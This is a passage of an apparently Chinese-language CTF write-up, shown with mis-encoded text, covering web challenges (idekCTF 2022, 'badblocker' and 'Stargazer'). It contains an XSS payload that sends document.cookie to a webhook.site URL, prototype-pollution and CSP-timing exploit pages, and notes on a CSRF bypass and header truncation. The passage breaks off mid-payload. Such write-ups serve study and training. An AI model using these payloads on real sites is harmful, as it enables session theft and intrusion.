<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;&lt;/pre&gt;&#34;</span>:<span style="color:#e6db74">&#34;&lt;iframe srcdoc=&#39;&lt;iframe name=config srcdoc=&amp;quot;&lt;title id=debug&gt;a&lt;/title&gt;&lt;frameset id=opts cols=a:eval(/*&gt;&lt;/frameset&gt;&amp;quot;&gt;&lt;/iframe&gt;&lt;div id=json-input&gt;{&amp;quot;x&amp;quot;:&amp;quot;*/fetch(&amp;#039;https://webhook.site/689e62cc-c516-4cec-a302-9bdc67202cc5?cookie=&amp;#039;+document.cookie))//&amp;quot;}&lt;/div&gt;&lt;script src=static/js/main.js&gt;&lt;/script&gt;&#39;&gt;&lt;/iframe&gt;&#34;</span>}
</span></span></code></pre></div><p>ä¹Ÿå¯åƒåœ¨<a href="https://www.zeyu2001.com/">@zeyu2001</a>å¸ˆå‚…ä¸­ç”¨<code>name</code>å»å–å¾—å¤–å±‚çš„<code>name</code>çš„å€¼ï¼Œæˆ‘çš„ç†è§£æ˜¯<code>name</code>ç­‰åŒäº<code>this.name</code>ï¼Œåœ¨<code>&lt;iframe&gt;</code>ä¸­ï¼Œthisè¿”å›çš„æ˜¯ä¸€ä¸ª<code>windows</code>å¯¹è±¡ï¼Œthis.nameå°±è¿”å›çª—å£çš„åå­—ï¼Œè€Œ<code>&lt;iframe&gt;</code>æ ‡ç­¾ä¸­çš„nameå±æ€§å°±æ˜¯è®¾ç½®çª—å£åç§°ï¼Œæ‰€ä»¥å¯ä»¥åœ¨å†…å±‚ä½¿ç”¨<code>name</code>å˜é‡æ¥è·å¾—å€¼ã€‚</p>
<h2 id="badblocker">badblocker</h2>
<p>ä»å‡ºé¢˜äºº<code>@IcesFont#1629</code>ç»™çš„æ€è·¯å¤ç°</p>
<p>é¢˜ç›®æä¾›äº†é™„ä»¶ï¼Œèµ·æ‰‹å…ˆçœ‹ä¸€æ‰‹<code>bot</code>ï¼Œ<code>flag</code>æ”¾åœ¨<code>localStorage</code>çš„<code>blockHistory</code>ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„æœ€ç»ˆç›®çš„æ˜¯<code>XSS</code>ï¼Œé‚£ä¹ˆå¼€æ‰¾æºç ä¸­æœ‰æ²¡æœ‰å“ªé‡Œçš„<code>DOM</code>å¯æ§ï¼Œå‘ç°å”¯ä¸€çš„å¯æ§ç‚¹åœ¨<code>utils.js</code>ä¸­çš„<code>showHistory</code>å‡½æ•°ï¼Œçœ‹ä¸‹å…³é”®ä»£ç </p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span> [<span style="color:#a6e22e">date</span>, { <span style="color:#a6e22e">url</span>, <span style="color:#a6e22e">numBlocked</span> }] <span style="color:#66d9ef">of</span> Object.<span style="color:#a6e22e">entries</span>(<span style="color:#a6e22e">history</span>).<span style="color:#a6e22e">reverse</span>()) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">historyHTML</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">`&lt;p&gt;</span><span style="color:#e6db74">${</span><span style="color:#66d9ef">new</span> Date(<span style="color:#f92672">+</span><span style="color:#a6e22e">date</span>).<span style="color:#a6e22e">toDateString</span>()<span style="color:#e6db74">}</span><span style="color:#e6db74"> - &lt;code&gt;</span><span style="color:#e6db74">${</span>encodeURI(<span style="color:#a6e22e">url</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/code&gt;&lt;br&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                &lt;b&gt;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">numBlocked</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> ads blocked&lt;/b&gt;&lt;/p&gt;`</span>;
</span></span><span style="display:flex;"><span>        }
</span></span></code></pre></div><p>æ˜æ˜¾æœ€ç»ˆåªæœ‰<code>numBlocked</code>æœ‰å¯èƒ½æ€§ï¼Œçœ‹çœ‹<code>numBlocked</code>åœ¨å“ªé‡Œè¢«è®¾ç½®ï¼Œæ‰¾åˆ°åœ¨<code>viewer.html</code>ä¸­çš„<code>clearFrame()</code>ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">clearFrame</span>(<span style="color:#a6e22e">frame</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> Promise(<span style="color:#66d9ef">async</span> <span style="color:#a6e22e">resolve</span> =&gt; {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">numChildren</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">frame</span>.<span style="color:#a6e22e">length</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">numChildren</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">clearFrame</span>(<span style="color:#a6e22e">frame</span>[<span style="color:#a6e22e">i</span>]);
</span></span><span style="display:flex;"><span>        }	
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">numBlocked</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">numChildren</span>;
</span></span></code></pre></div><p>åœ¨è¿›è¡Œä¸‹ä¸€æ­¥å‰ï¼Œå…ˆä»‹ç»ä¸‹é¢˜ç›®çš„ä¸šåŠ¡é€»è¾‘ï¼šä»‹ç»æ˜¯ä¸€ä¸ªå¹¿å‘Šå±è”½å™¨ï¼Œè¾“å…¥<code>url</code>åä½œä¸º<code>&lt;iframe id=viewer&gt;</code>çš„<code>src</code>å»è®¿é—®ï¼Œç„¶åè·å¾—æŒ‡å®šurlé¡µé¢ä¸­çš„<code>&lt;iframe&gt;</code>æ ‡ç­¾ï¼Œå¯¹å…¶éå†é€’å½’ä½¿ç”¨<code>clearFrame</code>å‡½æ•°æ¸…é™¤è¾¾åˆ°å±è”½å¹¿å‘Šçš„æ•ˆæœï¼Œç„¶åå¯¹äºè®¿é—®æ˜¯ä¼šæœ‰è®°å½•çš„ï¼Œå¯ä»¥å¯¼å‡ºè®°å½•å’Œåˆå¹¶è®°å½•ã€‚å›åˆ°<code>clearFrame</code>å‡½æ•°ï¼Œåªè¦<code>frame.length</code>å¯æ§ï¼Œæˆ‘ä»¬å°±å¯ä»¥<code>XSS</code>ã€‚åœ¨åˆå¹¶è®°å½•ä¸­ä½¿ç”¨åˆ°äº†<code>combineHistories</code>å‡½æ•°ï¼Œå…¶ä¸­ä»£ç å¦‚ä¸‹ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">combineHistories</span>(<span style="color:#a6e22e">history</span>, <span style="color:#a6e22e">addedHistory</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span> [<span style="color:#a6e22e">date</span>, <span style="color:#a6e22e">record</span>] <span style="color:#66d9ef">of</span> Object.<span style="color:#a6e22e">entries</span>(<span style="color:#a6e22e">addedHistory</span>)) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(<span style="color:#a6e22e">date</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">history</span>)) <span style="color:#a6e22e">history</span>[<span style="color:#a6e22e">date</span>] <span style="color:#f92672">=</span> {};
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span> [<span style="color:#a6e22e">k</span>, <span style="color:#a6e22e">v</span>] <span style="color:#66d9ef">of</span> Object.<span style="color:#a6e22e">entries</span>(<span style="color:#a6e22e">record</span>)) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">history</span>[<span style="color:#a6e22e">date</span>][<span style="color:#a6e22e">k</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">v</span>; <span style="color:#75715e">// ğŸ…±ï¸
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">history</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>å…¶ä¸­çš„<code>addedHistory</code>æˆ‘ä»¬å®Œå…¨å¯æ§ï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œå­˜åœ¨åŸå‹é“¾æ±¡æŸ“ï¼Œè¿™é‡Œçš„<code>history</code>æ˜¯<code>window.blockHistory</code>ï¼Œä¹Ÿå°±æ˜¯ç›´æ¥æ±¡æŸ“<code>window</code>çš„åŸå‹ï¼Œç„¶åå› ä¸º<code>frame</code>æ˜¯<code>window</code>ç±»å‹ï¼Œæ‰€ä»¥å½“<code>frame[i]</code>ä¸å­˜åœ¨æ—¶ï¼Œä¼šæ‰¾åˆ°ä½¿ç”¨<code>window.__proto__</code>çš„å€¼ã€‚é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•è®©<code>frame[i]</code>ä¸å­˜åœ¨å‘¢ï¼Œå¯ä»¥ä½¿ç”¨<code>location =</code>è¿›è¡Œè·³è½¬ï¼Œå› ä¸ºä¼ å…¥<code>clearFrame</code>çš„æ˜¯windowå¯¹è±¡ï¼Œè€Œä¸æ˜¯ç½‘é¡µå†…å®¹ï¼Œç¬¬ä¸€æ¬¡è·å¾—é¡µé¢çš„<code>&lt;iframe&gt;</code>çš„æ•°é‡ï¼Œæˆ‘ä»¬è¿™é‡Œå¯ä»¥è®¾ç½®ä¸º2ï¼Œç„¶åè·³è½¬åˆ°ä¸€ä¸ªæ²¡æœ‰<code>&lt;iframe&gt;</code>çš„é¡µé¢ï¼Œå¦‚æœæ§åˆ¶å¥½æ—¶é—´è¿™é‡Œçš„<code>frame[1]</code>æ˜¯<code>undefined</code>ï¼Œä¹Ÿå°±å¯ä»¥å–å¾—åŸå‹é“¾æ±¡æŸ“åçš„å€¼ã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">PAYLOAD</span> <span style="color:#f92672">=</span> encodeURIComponent(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({
</span></span><span style="display:flex;"><span>        [<span style="color:#e6db74">&#34;__proto__&#34;</span>]<span style="color:#f92672">:</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;1&#34;</span><span style="color:#f92672">:</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;length&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&lt;img src=x onerror=\&#34;console.log(1)\&#34;&gt;&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;location&#34;</span><span style="color:#f92672">:</span> {},
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }))
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`http://localhost:30011/import-history.html?history=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">PAYLOAD</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>
</span></span></code></pre></div><p>é‚£ä¹ˆå¦‚ä½•æ§åˆ¶æ—¶é—´ï¼Œæˆ‘å°è¯•ä½¿ç”¨<code>setTimeout</code>å‘ç°å…¶æ²¡æœ‰åˆ©ç”¨çš„å¯èƒ½ï¼Œè¿™é‡Œå‡ºé¢˜äººç”¨åˆ°çš„æ˜¯<code>CSP</code>ï¼Œåœ¨<code>clearFrame</code>çš„æ—¶å€™ï¼Œä¼šå°†<code>iframe</code>é‡å®šå‘åˆ°<code>/blocked.html</code>ç„¶åå¼‚æ­¥æ£€æµ‹åŒæº</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>		<span style="color:#a6e22e">frame</span>.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/blocked.html&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// wait until same-origin before logging the frame name
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sameOriginCheck</span>(<span style="color:#a6e22e">frame</span>).<span style="color:#a6e22e">then</span>(() =&gt; {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">debug</span>(<span style="color:#a6e22e">frame</span>.<span style="color:#a6e22e">name</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">&#34;(no name)&#34;</span>, <span style="color:#e6db74">&#34;blocked&#34;</span>);
</span></span><span style="display:flex;"><span>        })
</span></span><span style="display:flex;"><span>        .<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span> =&gt; <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">e</span>));
</span></span></code></pre></div><p>å› ä¸º<code>iframe</code>è¢«é‡å®šå‘åˆ°äº†<code>/blocked.html</code>æ‰€ä»¥æ˜¯åŒæºçš„ï¼Œå¾ˆå¿«å°±ç»“æŸäº†æ£€æµ‹ã€‚è¿™é‡Œä½¿ç”¨<code>CSP</code>æ¥é˜»æ­¢<code>iframe</code>å†…çš„é‡å®šå‘</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">http-equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Content-Security-Policy&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;frame-src &#39;none&#39;;&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
</span></span></code></pre></div><p>å› ä¸ºæ‰§è¡Œè¿™ä¸¤ä¸ªå‡½æ•°éƒ½æ˜¯ç”¨çš„<code>await</code>æ‰€ä»¥ä¼šç­‰å¾…åé¢å‡½æ•°æ‰§è¡Œå®Œåæ‰ä¼šè¿›è¡Œä¸‹ä¸€æ­¥</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">clearFrame</span>(<span style="color:#a6e22e">frame</span>[<span style="color:#a6e22e">i</span>]);
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sameOriginCheck</span>(<span style="color:#a6e22e">frame</span>).<span style="color:#a6e22e">then</span>(() =&gt; {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">debug</span>(<span style="color:#a6e22e">frame</span>.<span style="color:#a6e22e">name</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">&#34;(no name)&#34;</span>, <span style="color:#e6db74">&#34;blocked&#34;</span>);
</span></span><span style="display:flex;"><span>        })
</span></span><span style="display:flex;"><span>        .<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span> =&gt; <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">e</span>));
</span></span></code></pre></div><p>ç„¶ååœ¨<code>sameOriginCheck</code>å‡½æ•°ä¸­ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">sameOriginCheck</span>(<span style="color:#a6e22e">frame</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> Promise((<span style="color:#a6e22e">resolve</span>, <span style="color:#a6e22e">reject</span>) =&gt; {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">tries</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">check</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">setInterval</span>(() =&gt; {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">tries</span><span style="color:#f92672">++</span>; <span style="color:#75715e">// keep trying until same-origin
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">tries</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">250</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">clearInterval</span>(<span style="color:#a6e22e">check</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">reject</span>(<span style="color:#e6db74">&#34;Maximum number of tries exceeded&#34;</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">frame</span>.<span style="color:#a6e22e">origin</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">origin</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">clearInterval</span>(<span style="color:#a6e22e">check</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">resolve</span>();
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            ...
</span></span><span style="display:flex;"><span>        }, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    });
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>å¦‚æœæ²¡æ£€æµ‹åˆ°åŒæºï¼Œä¼šæœ€å¤šå¾ªç¯<code>250</code>æ¬¡ï¼Œé€ æˆé˜»å¡åœ¨<code>sameOriginCheck</code>ä½ç½®çš„æ—¶å€™<code>location</code>è·³è½¬æ±¡æŸ“åŸå‹é“¾ï¼Œç„¶åé˜»å¡ç»“æŸï¼Œç»§ç»­<code>clearFrame</code>ï¼Œç„¶å<code>await clearFrame(frame[1]);</code>ä¸å­˜åœ¨ï¼Œä½¿ç”¨åŸå‹é“¾æ±¡æŸ“åçš„å€¼ã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">http-equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Content-Security-Policy&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;frame-src &#39;none&#39;;&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>window.<span style="color:#a6e22e">onsecuritypolicyviolation</span> <span style="color:#f92672">=</span> () =&gt; {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">PAYLOAD</span> <span style="color:#f92672">=</span> encodeURIComponent(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({
</span></span><span style="display:flex;"><span>        [<span style="color:#e6db74">&#34;__proto__&#34;</span>]<span style="color:#f92672">:</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;1&#34;</span><span style="color:#f92672">:</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;length&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&lt;img src=x onerror=\&#34;console.log(1)\&#34;&gt;&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;location&#34;</span><span style="color:#f92672">:</span> {},
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }))
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`http://localhost:30011/import-history.html?history=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">PAYLOAD</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;a&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;b&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
</span></span></code></pre></div><h2 id="stargazer">Stargazer</h2>
<p>æ ¹æ®å‡ºé¢˜äºº<a href="https://github.com/nyxsorcerer/idekctf-2022-stargazer">@nyxmare</a>æä¾›çš„payloadè¿›è¡Œå­¦ä¹ ï¼Œé¢˜ç›®éš¾ï¼Œæ‰€ä»¥è¿™é¢˜æ›´å¤šæ˜¯å»ç†è§£å‡ºé¢˜äººçš„è§£æ³•ï¼Œæ²¡å•¥è‡ªå·±çš„æƒ³æ³•</p>
<p>ä¸‹è½½é™„ä»¶ï¼Œå…ˆçœ‹ä¸€æ‰‹botï¼Œå‘ç°<code>flag</code>åœ¨<code>cookie</code>ä¸­ï¼Œä¸”è®¾ç½®çš„åŸŸä¸º<code>&quot;domain&quot;:&quot;.backend.magic.world&quot;</code>ï¼Œæ‰€ä»¥ç›®æ ‡æ˜¯åç«¯çš„<code>XSS</code>ã€‚æŸ¥çœ‹é™„ä»¶ä¸­nginxçš„é…ç½®ï¼Œå‘ç°é¢˜ç›®åˆ†ä¸ºå‰åç«¯ï¼Œå‰åç«¯åˆ†ç¦»ï¼Œå†çœ‹ä¸€çœ¼å‰ç«¯å°±ä¸€ä¸ª<code>index.html</code>ï¼Œè¯»äº†ä¸‹ä»£ç ï¼Œå‘ç°è™½ç„¶å¯ä»¥åŸå‹é“¾æ±¡æŸ“<code>&lt;iframe&gt;</code>æ‰§è¡Œä»»æ„JSï¼Œä½†æ˜¯å› ä¸º<code>bot</code>çš„åŸŸçš„åŸå› ï¼Œè¿™é‡Œæ— æ³•ç›´æ¥ä½¿ç”¨ï¼Œç„¶ååç«¯æœ‰ä½¿ç”¨ç®€å•çš„<code>template</code>æ¸²æŸ“ï¼Œçœ‹äº†ä¸‹å†™æ³•ï¼Œå‘ç°æ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ã€‚</p>
<p>æ ¹æ®<code>payload</code>å‘ç°<code>XSS</code>ï¼Œåœ¨åç«¯æŸ¥çœ‹æ–‡ä»¶çš„è·¯ç”±ä¸­</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">Any</span>(<span style="color:#e6db74">&#34;/file/:uuid/:filename&#34;</span>, <span style="color:#a6e22e">viewFileHandler</span>, <span style="color:#a6e22e">isLoggedIn</span>)
</span></span></code></pre></div><p>è¿™é‡Œæ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œä½†æ˜¯<code>viewFileHandler</code>åªç”¨åˆ°äº†<code>uuid</code>ï¼Œæ‰€ä»¥<code>filename</code>å¯ä»¥éšä¾¿è®¾ç½®ï¼Œåœ¨<code>viewFileHandler</code>å‡½æ•°ä¸­</p>
<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202301232040325.png" alt="image-20230123204023104"></p>
<p>æ ¹æ®<code>UUID</code>åœ¨æ•°æ®åº“ä¸­è·å¾—ä¸Šä¼ æ—¶ä¼ å…¥çš„<code>FilesUpload</code>ç»“æ„ä½“æ•°æ®</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">FilesUpload</span> <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">UUID</span>        <span style="color:#66d9ef">string</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Title</span>       <span style="color:#66d9ef">string</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ContentType</span> <span style="color:#66d9ef">string</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Filename</span>    <span style="color:#66d9ef">string</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Username</span>    <span style="color:#66d9ef">string</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>ç„¶åå°†å…¶è®¾ç½®åœ¨å“åº”å¤´ä¸­ã€‚è¿™é‡Œä½œè€…åœ¨æ³¨å†Œæ—¶åœ¨<code>Username</code>ä¸­ä½¿ç”¨äº†ç©ºå­—èŠ‚æ¥æˆªæ–­å“åº”å¤´ï¼Œè¾¾åˆ°XSSçš„ç›®çš„</p>
<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202301232133026.png" alt="image-20230123213302840"></p>
<p>æ—¢ç„¶XSSçš„ç‚¹æ‰¾åˆ°äº†ï¼Œä½†æ˜¯è®¿é—®æ–‡ä»¶è·¯ç”±æ—¶éœ€è¦<code>session</code>ï¼Œä¹Ÿå°±éœ€è¦æˆ‘ä»¬å…ˆç™»å½•è·å–<code>set-cookie</code>åˆ°botçš„ç¯å¢ƒä¸‹ï¼Œä½†æ˜¯è®¿é—®<code>/login</code>æ¥å£éœ€è¦<code>_csrf</code>ä»¤ç‰Œç¬¦åˆï¼Œæ ¹æ®é…ç½®</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">Use</span>(<span style="color:#a6e22e">middleware</span>.<span style="color:#a6e22e">CSRFWithConfig</span>(<span style="color:#a6e22e">middleware</span>.<span style="color:#a6e22e">CSRFConfig</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">TokenLookup</span>:    <span style="color:#e6db74">&#34;form:_csrf,header:X-CSRF-TOKEN&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">CookieHTTPOnly</span>: <span style="color:#66d9ef">true</span>,
</span></span><span style="display:flex;"><span>	}))
</span></span></code></pre></div><p>å‘ç°åªè¦è®¿é—®<code>/login</code>æ—¶ä¸Šä¼ çš„è¡¨å•ä¸­çš„<code>_csrf</code>å’ŒCookieä¸­çš„<code>_csrf</code>å€¼ä¸€è‡´å°±å¯ç»•è¿‡è¿™ä¸ªé…ç½®ï¼Œè¯·æ±‚ä¸ä¼šè¢«æ‹’ç»ã€‚è¡¨å•ä¸­çš„<code>_csrf</code>åŠ ä¸ª<code>&lt;input&gt;</code>å°±è¡Œï¼Œå°±å‰©Cookieä¸­çš„<code>_csrf</code>è¯¥å¦‚ä½•è®¾ç½®å‘¢ã€‚ä¸‹é¢æ˜¯è¿™ä¸€æ®µçš„payload:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">root_domain</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.magic.world&#34;</span>
